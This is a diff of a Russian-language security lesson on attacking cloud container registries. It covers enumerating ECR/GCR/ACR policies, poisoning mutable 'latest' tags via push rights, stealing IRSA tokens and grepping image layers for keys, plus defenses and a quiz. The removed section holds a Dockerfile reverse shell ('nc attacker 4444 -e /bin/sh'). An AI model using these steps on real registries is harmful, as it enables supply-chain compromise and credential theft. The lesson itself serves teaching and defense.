@@ -14,274 +14,232 @@ useful_for:
 estimated_minutes: 45
 summary: "Как атаковать облачные container registries: открытые ECR/GCR/ACR, слабая аутентификация, отравление образов, теги mutable и pull-секреты. Пути к компрометации деплоя."
 ---
+## Задача
 
-Container registry хранит образы, которые деплоятся в кластеры. Если атакующий может **записать** образ или подменить тег, он контролирует код в продакшене. Урок про обнаружение открытых registries, слабую аутентификацию и отравление образов.
+В прошлом уроке (`cloud-supply-chain`) мы подкладывали пакет в реестр зависимостей. Но код в облако попадает не только как npm/pip-пакет, а ещё как **контейнерный образ** — собранный «слепок» приложения, который хранится в **registry** (реестре образов): ECR у AWS, GCR/Artifact Registry у GCP, ACR у Azure.
 
-## Как устроены облачные registries
+Задача: найти образ, которым можно злоупотребить, и превратить доступ к registry в выполнение кода в чужом кластере или на чужом CI. Разберём на конкретном AWS-аккаунте.
 
-| Registry | Облако | Эндпоинт |
-|----------|--------|----------|
-| ECR | AWS | `<acct>.dkr.ecr.<region>.amazonaws.com` |
-| GCR/Artifact Registry | GCP | `gcr.io`, `<region>-docker.pkg.dev` |
-| ACR | Azure | `<name>.azurecr.io` |
-| Docker Hub | любой | `registry-1.docker.io` |
+## Данные: аккаунт и его registry
 
-Аутентификация:
+У нас есть низкопривилегированные креды AWS. Смотрим, какие репозитории образов вообще есть:
 
-```bash
-# ECR
-aws ecr get-login-password | docker login --username AWS \
-  --password-stdin <acct>.dkr.ecr.<region>.amazonaws.com
-# GCR
-gcloud auth configure-docker
-# ACR
-az acr login --name <name>
+```
+$ aws ecr describe-repositories --query 'repositories[].repositoryName'
+[
+  "acme/webapp",
+  "acme/worker",
+  "acme/deploy-tools"
+]
 ```
 
-## Разведка registries
+`describe-repositories` — вызов API ECR (Elastic Container Registry), который перечисляет репозитории. Три репозитория. Нас интересует политика доступа каждого:
 
-```bash
-# ECR: список репозиториев и образов
-aws ecr describe-repositories --query 'repositories[].repositoryUri'
-aws ecr list-images --repository-name <repo>
-aws ecr get-repository-policy --repository-name <repo>   # resource policy!
-
-# GCR/Artifact Registry
-gcloud artifacts repositories list
-gcloud artifacts docker images list <location>-docker.pkg.dev/<proj>/<repo>
-
-# ACR
-az acr repository list --name <name>
-az acr repository show-tags --name <name> --repository <repo>
+```
+$ aws ecr get-repository-policy --repository-name acme/deploy-tools
+{
+  "policyText": "{\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":[\"ecr:GetDownloadUrlForLayer\",\"ecr:BatchGetImage\",\"ecr:PutImage\"],\"Condition\":{\"StringEquals\":{\"aws:PrincipalOrgID\":\"o-acme\"}}}]}"
+}
 ```
 
-Публичные registries: ECR может иметь resource policy с `Principal: "*"`; GCR/ACR — публичные репозитории. Проверяйте анонимный доступ:
+Политика разрешает `ecr:PutImage` (загрузку образа) всем принципалам организации. Это значит: любой, кто попал в организацию, может **залить свой образ** в доверенный репозиторий.
 
-```bash
-# Анонимный pull (если публичный)
-docker pull <registry>/<repo>:<tag>
-skopeo inspect docker://<registry>/<repo>:<tag>
+## Пробуем в лоб: можно ли просто прочитать образ?
+
+Прежде чем атаковать, проверим, не отдаётся ли репозиторий анонимно. Публичный ECR встречается реже, чем открытый S3, но бывает:
+
+```
+$ aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 123456789012.dkr.ecr.us-east-1.amazonaws.com
+Login Succeeded
 ```
 
-## Извлечение секретов из образов
+Логин прошёл с нашими кредами — значит, мы уже внутри registry. Теперь смотрим образ, который использует деплой:
 
-Образы содержат слои с историей. Секреты — в `ENV`, файлах, `.git`.
-
-```bash
-# Скачать и распаковать образ
-docker pull <registry>/<repo>:<tag>
-docker save <registry>/<repo>:<tag> -o img.tar
-mkdir img && tar -xf img.tar -C img
-# Слои
-ls img/*/layer.tar
-# Искать секреты
-for l in img/*/layer.tar; do tar -tf "$l" 2>/dev/null; done | grep -iE '\.env|\.npmrc|id_rsa|credentials'
-# История (команды сборки, включая ARG/ENV с секретами)
-docker history --no-trunc <registry>/<repo>:<tag>
+```
+$ docker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/deploy-tools:latest
+latest: Pulling from acme/deploy-tools
+Digest: sha256:9f2c...
+Status: Downloaded newer image for .../acme/deploy-tools:latest
 ```
 
-```bash
-# Прямой поиск секретов в слоях
-tar -xf img.tar -C img
-grep -rE 'AKIA[0-9A-Z]{16}|BEGIN (RSA|OPENSSH) PRIVATE KEY' img/ 2>/dev/null
+## Приём: mutable-тег и отравление образа
+
+**Тег** (`latest`, `v1.2`) — это человекочитаемая метка. Проблема в том, что тег **mutable** (изменяемый): под тем же `latest` может лежать уже другой образ. Деплой по тегу `latest` — это деплой «чего угодно, что сейчас под тегом».
+
+Если у нас есть `PutImage`, мы можем перезаписать `latest` своим образом:
+
+```
+$ docker tag attacker-payload:evil 123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/deploy-tools:latest
+$ docker push 123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/deploy-tools:latest
+The push refers to repository [.../acme/deploy-tools]
+latest: digest: sha256:deadbeef... size: 1234
 ```
 
-## Отравление образов
+Дальше чужой пайплайн делает `docker pull .../acme/deploy-tools:latest` и запускает наш код — с теми правами и секретами, что есть у деплоя.
 
-Если есть **push**-права (или слабая аутентификация), можно подменить образ, который задеплоят.
+## Полный прогон: от Pull до облачных кредов
 
-```bash
-# Тег mutable: перезапись существующего тега
-docker pull <registry>/<repo>:latest
-docker tag backdoor <registry>/<repo>:latest
-docker push <registry>/<repo>:latest
-# Теперь деплой подтянет backdoor
+1. **Разведка.** `describe-repositories` → список репозиториев; `get-repository-policy` → видим `PutImage` для широкого круга.
+2. **Логин.** `get-login-password | docker login` проходит с нашими кредами.
+3. **Смотрим образ.** `docker pull .../acme/deploy-tools:latest`, `docker inspect` → видим, что запускается, какие env ждёт.
+4. **Отравление.** Собираем образ с нашим entrypoint, тегируем тем же `latest`, `docker push`.
+5. **Срабатывание.** CI/деплой тянет `latest`, исполняет наш код.
+6. **Секреты.** Наш процесс читает окружение и файлы, где у деплоя лежат креды:
+
+```
+$ docker run --rm .../acme/deploy-tools:latest env | grep -i aws
+AWS_ROLE_ARN=arn:aws:iam::123456789012:role/deploy-admin
+AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
 ```
 
-Опасные конфигурации:
-- **Mutable tags** (`latest`) без digest-pinning — подмена тега не детектится.
-- **Resource policy с push** для широкой группы.
-- **CI push-токены** в открытом виде.
-- **Pull secrets** кластера, дающие push.
+Это **IRSA** — механизм, при котором под получает AWS-роль через токен. С таким токеном роль `deploy-admin` становится нашей.
 
-```bash
-# Деплой часто пинит по digest — проверяйте
-kubectl get deploy -A -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.spec.template.spec.containers[*].image}{"\n"}{end}'
+## Публичные реестры и утечки в образах
+
+Реестр может утекать и без записи. Ищите:
+
+- **Публичные репозитории.** У GCP: `gcloud artifacts repositories list`, проверка `--allow-vuln-scanning` и прав `allUsers`. У ACR: `az acr repository list`.
+- **Секреты внутри образов.** Кто-то собрал образ с `.env` или ключом в слое:
+
+```
+$ docker save .../acme/worker:latest -o worker.tar
+$ tar xf worker.tar && grep -rE 'AKIA[0-9A-Z]{16}' .
+manifest.json:... "AKIAIOSFODNN7EXAMPLE"
 ```
 
-## Разобранный пример: ACR с push → backdoor в продакшене
+- **История слоёв.** Секрет, удалённый в следующем слое, всё равно остаётся в предыдущем: `docker history --no-trunc`.
 
-**Дано:** найден ACR с открытым `az acr login` через утёкший токен CI.
+## Другие registry: GCR и ACR
 
-1. Проверяем доступ:
+Тот же принцип работает у GCP и Azure, отличаются команды.
 
-```bash
-az acr login --name <name>
-az acr repository list --name <name>
-az acr repository show-tags --name <name> --repository app
+**GCP Artifact Registry / GCR.** Список репозиториев и проверка публичного доступа:
+
+```
+$ gcloud artifacts repositories list --format='table(name,format)'
+NAME               FORMAT
+acme-images        DOCKER
+$ gcloud artifacts repositories get-iam-policy acme-images --format=json
+{ "bindings": [ { "role": "roles/artifactregistry.writer", "members": ["allAuthenticatedUsers"] } ] }
 ```
 
-2. Собираем backdoor-образ и пушим под тем же тегом:
+`allAuthenticatedUsers` в роли `writer` — это разрешение на push любому, кто прошёл аутентификацию в Google. Тот же mutable-тег даёт подмену.
 
-```bash
-cat > Dockerfile <<'EOF'
-FROM alpine
-CMD ["/bin/sh","-c","nc attacker 4444 -e /bin/sh"]
-EOF
-docker build -t <name>.azurecr.io/app:latest .
-docker push <name>.azurecr.io/app:latest
+**Azure ACR.** Проверяем, не отдаётся ли реестр анонимно:
+
+```
+$ az acr show --name acmeacr --query "{adminUserEnabled:adminUserEnabled,publicNetworkAccess:publicNetworkAccess}"
+{ "adminUserEnabled": true, "publicNetworkAccess": "Enabled" }
 ```
 
-3. При следующем rollout кластера образ подхватится (если тег mutable). Получаем shell.
+`adminUserEnabled: true` — включён единый admin-аккаунт с паролем; `az acr credential show` выдаёт его, и запись в реестр открыта.
 
-## Защита
+## Защита и что ломает атаку
 
-- **Immutable tags** и **digest-pinning** в деплое (`image@sha256:...`).
-- **Подпись образов** (cosign/Sigstore) и verify в admission controller.
-- **Строгие resource policies** — никаких wildcard push.
-- **Сканирование образов** (Trivy, Grype) в CI.
-- **Не хранить секреты в слоях** — использовать build secrets (`--secret`).
+- **Immutable-теги** — включить неизменяемость: перезапись `latest` отвергается.
+- **Deploy по digest.** `.../deploy-tools@sha256:9f2c...` вместо тега — образ неизменяем.
+- **Подписи образов** (cosign/Notation) — деплой принимает только подписанные образы (см. `cloud-supply-chain-sbom`).
+- **Строгие политики ECR/ACR** — `PutImage` только узкому кругу ролей, не всей организации.
+- **Сканирование** — ECR image scanning, Trivy, Grype находят секреты и уязвимости в слоях.
+
+## Если не сработало
+
+- **Immutable-теги** — push под тем же тегом отвергнут.
+- **Deploy по digest** — подмена тега ни на что не влияет.
+- **Нет `PutImage`** — только чтение; остаётся искать секреты внутри образов.
+- **Верификация подписи** — неподписанный образ не пройдёт admission.
+
+## Мини-сценарий: подмена образа целиком
+
+1. **Разведка.** `aws ecr describe-repositories` → `acme/deploy-tools`; `get-repository-policy` → `PutImage` для всей организации.
+2. **Логин.** `aws ecr get-login-password | docker login --username AWS --password-stdin ...` → `Login Succeeded`.
+3. **Изучение.** `docker pull .../acme/deploy-tools:latest`, `docker inspect` → видим entrypoint и ожидаемые env.
+4. **Отравление.** Собираем образ с нашим кодом, тегируем тем же `latest`, `docker push`.
+5. **Срабатывание.** Пайплайн деплоя тянет `latest` и запускает наш код.
+6. **Секреты.** Наш процесс читает `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` (IRSA) → роль `deploy-admin`.
+7. **Проверка.** `aws sts get-caller-identity` с токеном роли.
+
+Право `PutImage` плюс mutable-тег — и доверенный деплой исполняет наш код.
+
+## Что мы теперь знаем
+
+1. Registry — это ещё один «доверенный источник кода» в облаке.
+2. Mutable-тег позволяет перезаписать образ и подсунуть свой код деплою.
+3. `PutImage` для широкого круга = отравление доверенного репозитория.
+4. Образы часто содержат секреты в слоях и env.
+5. Защита — immutable-теги, digest, подписи, сканирование.
 
 ## Частые ошибки
 
-- **Считать registry только хранилищем.** Push = контроль деплоя.
-- **Игнорировать digest.** Без pinning тег mutable и подменяем.
-- **Не сканировать слои.** Секреты остаются в истории образа.
-- **Забывать про resource policy ECR.** Она может открывать push.
-- **Путать pull и push-права.** Читать может быть можно, писать — нет.
-- **Не проверять pull secrets кластера.** Они дают доступ к registry.
+- **Mutable-теги + деплой по тегу** — подмена образа проходит.
+- **`PutImage` для широкого круга** — любой в организации может залить образ.
+- **Нет подписей и сканирования** — отравленный образ неотличим.
+- **Публичные репозитории** — образы доступны всем.
+- **Секреты в слоях образа** — остаются в истории навсегда.
 
-## Что дальше / решение
+## На что смотреть дальше
 
-- Есть анонимный pull → сканируйте образы на секреты.
-- Есть push → отравляйте образ под mutable-тегом.
-- Есть digest-pinning → ищите другой путь (CI, admission).
-- Смежные уроки: `cloud-supply-chain`, `cloud-containers-docker`, `cloud-kubernetes-rbac`.
-
-## Команды по провайдерам
-
-```bash
-# AWS ECR
-aws ecr describe-repositories
-aws ecr list-images --repository-name app
-aws ecr get-login-password | docker login --username AWS --password-stdin <acct>.dkr.ecr.<region>.amazonaws.com
-docker pull <acct>.dkr.ecr.<region>.amazonaws.com/app:latest
-# GCP GCR/Artifact Registry
-gcloud artifacts repositories list
-gcloud artifacts docker images list <region>-docker.pkg.dev/<proj>/<repo>
-# Azure ACR
-az acr list -o table
-az acr repository list --name myacr
-az acr credential show --name myacr
-```
-
-## Секреты в слоях образов
-
-```bash
-docker save image:tag -o img.tar
-tar xf img.tar
-# перебрать слои
-for l in */layer.tar; do tar tf "$l" | grep -iE 'env|secret|cred|\.pem|id_rsa'; done
-```
-
-Также `dive` показывает слои интерактивно, а `trufflehog docker`/`trivy image` ищут секреты автоматически.
-
-## Отравление образов
-
-Если есть push в registry, от которого зависит продакшен, можно подменить образ (тот же тег) с backdoor. Это supply-chain-атака: следующий деплой развернёт вредоносный код. Защита — immutable-теги, подпись (cosign/notary), admission-контроль проверки подписи.
-
-## Практическое задание
-
-Соберите образ с «секретом» в слое, выгрузите его через `docker save` и найдите секрет. Затем настройте подпись образа (cosign) и проверку при деплое. Это демонстрирует и утечку через слои, и защиту через подписи.
-
-## Почему registry — цель
-
-Registry связан с пайплайном: у кого push — тот контролирует, что задеплоится. Даже read-доступ ценен: образы содержат креды в слоях. Push-доступ — прямая supply-chain-атака. Поэтому права на registry (ECR `PutImage`, ACR `AcrPush`, GCR `storage.objectCreator`) следует считать привилегированными и защищать подписью образов.
-
-## Чек-лист
-
-1. Найти registry (ECR/GCR/ACR), проверить анонимный/низкопривилегированный доступ.
-2. Перечислить репозитории и образы.
-3. Скачать образ, распаковать слои, найти секреты.
-4. Проверить push-права (есть ли возможность отравить образ).
-5. Оценить, какой пайплайн/кластер потребляет образ.
-6. Задокументировать цепочку и влияние.
-
-## Immutable-теги и подпись
-
-Mutable-тег (`latest`) можно перезаписать — это основа отравления. Immutable-теги и digest-ссылки (`image@sha256:...`) фиксируют артефакт. Подпись (cosign, notation) + admission-контроль, проверяющий подпись, не дают задеплоить неподписанный образ. Проверка:
-
-```bash
-cosign verify --key cosign.pub <registry>/<image>@sha256:...
-cosign verify-attestation --type slsaprovenance <image>
-```
-
-Без подписи любой, кто имеет push, может внедрить backdoor в продакшен.
-
-## Lifecycle-политики и удалённые образы
-
-Registry хранит историю тегов и слои даже после «удаления» тега. Lifecycle-политика может удалять старые образы, но до этого они доступны. Проверьте `list-images --filter tagStatus=UNTAGGED` (ECR) — untagged-образы часто содержат старые версии с секретами. Это дешёвый источник утечек, который пропускают при аудите.
-
-## Быстрая проверка registry
-
-```bash
-aws ecr describe-repositories
-aws ecr list-images --repository-name app --filter tagStatus=UNTAGGED
-gcloud artifacts repositories list
-az acr repository list --name myacr
-```
-
-Untagged-образы часто содержат старые версии с секретами. Проверьте анонимный доступ и push-права — оба критичны.
+- Политики репозиториев: кому разрешён `PutImage`.
+- Использует ли деплой тег (`latest`) или digest.
+- `docker history --no-trunc` и env образа на предмет секретов.
+- Настройки публичного доступа GCR/ACR/ECR.
+- Включены ли image scanning и подписи.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Почему mutable-тег (latest) опасен для supply chain?"
+- question: "Почему mutable-тег (latest) опасен для деплоя?"
   options:
-    - "Образ под тем же тегом можно подменить без изменения манифеста деплоя"
-    - "Он ускоряет pull"
-    - "Он шифрует образ"
-    - "Он безвреден"
+    - "Под тем же тегом можно залить другой образ, и деплой возьмёт его"
+    - "Тег шифрует образ"
+    - "Тег замедляет pull"
+    - "Тег отключает TLS"
   answer: 0
-  explanation: "Тег перезаписывается — деплой тянет новый образ."
-- question: "Где в образе часто остаются секреты?"
+  explanation: "Тег — изменяемая метка; перезапись подменяет образ."
+- question: "Какое право ECR позволяет подложить свой образ?"
   options:
-    - "В слоях, ENV и истории сборки"
-    - "В размере образа"
-    - "В теге"
-    - "В имени реестра"
+    - "ecr:PutImage"
+    - "ecr:DescribeRepositories"
+    - "ecr:GetAuthorizationToken"
+    - "ecr:ListImages"
   answer: 0
-  explanation: "Слои и история содержат значения из сборки."
-- question: "Что проверяют у ECR в первую очередь?"
+  explanation: "PutImage — это загрузка образа в репозиторий."
+- question: "Что надёжно фиксирует конкретный образ при деплое?"
   options:
-    - "Repository resource policy на wildcard principal"
-    - "Цвет консоли"
-    - "Регион по умолчанию"
-    - "Часовой пояс"
+    - "Ссылка по digest sha256"
+    - "Тег latest"
+    - "Имя репозитория"
+    - "Регион"
   answer: 0
-  explanation: "Resource policy может открыть доступ наружу."
-- question: "Как защититься от подмены образа в деплое?"
+  explanation: "Digest неизменяем, в отличие от тега."
+- question: "Почему секрет, удалённый в следующем слое образа, всё ещё опасен?"
   options:
-    - "Digest-pinning и подпись образов (cosign)"
-    - "Использовать latest"
-    - "Отключить сканирование"
-    - "Публичный registry"
+    - "Он остаётся в предыдущем слое образа"
+    - "Он автоматически шифруется"
+    - "Он удаляется из реестра"
+    - "Он исчезает после push"
   answer: 0
-  explanation: "Digest + подпись фиксируют конкретный образ."
-- question: "Чем опасен утёкший push-токен registry?"
+  explanation: "Слои неизменяемы; секрет виден в истории."
+- question: "Что проверяет cosign при деплое образа?"
   options:
-    - "Позволяет залить backdoor-образ под легитимным тегом"
-    - "Только замедляет сборку"
-    - "Меняет DNS"
-    - "Он безвреден"
+    - "Криптографическую подпись образа"
+    - "Скорость pull"
+    - "Размер образа"
+    - "Версию Docker"
   answer: 0
-  explanation: "Push = контроль того, что задеплоится."
+  explanation: "cosign verify проверяет подпись, отсекая подмену."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-terraform`) мы посмотрим на ещё один источник доверия — инфраструктуру как код. Там секреты живут не в образе, а в **state**-файле Terraform, и это часто самый быстрый путь к облачным ключам. А пока главное: реестр образов — это доверенный деплой-канал, и право записи в него равно праву выполнять код в чужом кластере.
 
 ## Где пригодится
 
-- **Red team:** от registry к продакшену через отравление образа.
-- **Пентест:** аудит registries, resource policies, digest-pinning.
-- **CTF:** задачи с container registry.
-- **Работа/DevSecOps:** immutable tags, подписи, сканирование, build secrets.
-- **Дальше по дереву:** `cloud-supply-chain`, `cloud-containers-docker`.
+- **Bug bounty:** публичные registry и слабые политики push.
+- **Red team:** отравление образа как путь к деплою.
+- **Пентест:** аудит ECR/GCR/ACR и образов.
+- **Работа/DevSecOps:** immutable-теги, digest-деплой, подписи, сканирование.
+- **Дальше по дереву:** `cloud-supply-chain-sbom`, `cloud-terraform`, `cloud-k8s-image-supply-chain`.
